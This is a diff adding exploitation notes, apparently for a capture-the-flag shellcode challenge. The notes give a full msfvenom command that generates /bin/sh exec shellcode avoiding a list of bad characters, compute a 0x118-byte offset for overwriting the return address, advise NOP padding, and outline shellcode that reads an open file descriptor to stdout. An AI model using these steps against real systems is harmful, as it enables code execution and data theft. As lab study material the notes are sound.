@@ -110,3 +110,29 @@ pwndbg> x/4gx $rbp
 0x7ffd5fdaecd0: 0x050f99583b6a5f54      0x00007ffd5fdace2c
 
 WTF why does the order of the payload matter?
+
+WAF:
+Badchars: abcdefghijklmonpqurtsABCD/binshh
+Need to create shellcode that avoids these characters
+
+msfvenom -p 'linux/x64/exec' CMD=bin/sh --arch x64 -b '\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6F\x6E\x70\x71\x75\x72\x74\x73\x41\x42\x43\x44\x2F\x62\x69\x6E\x73\x68\x68' -f python
+
+Send these characters over to the buffer.
+
+frame size = 0x110
+RIP = 8
+
+Therefore buff attack size = 0x110 + 8 = 0x118 bytes
+
+Please pad the shellcode with NOPS just in case!
+
+SIMPLE:
+
+Open file descriptor = 1000
+Read contents from fd
+write into the buffer
+make the shellcode do this:
+
+read(fd, buff, size)
+write(1, buf, nread)
+exit(0)
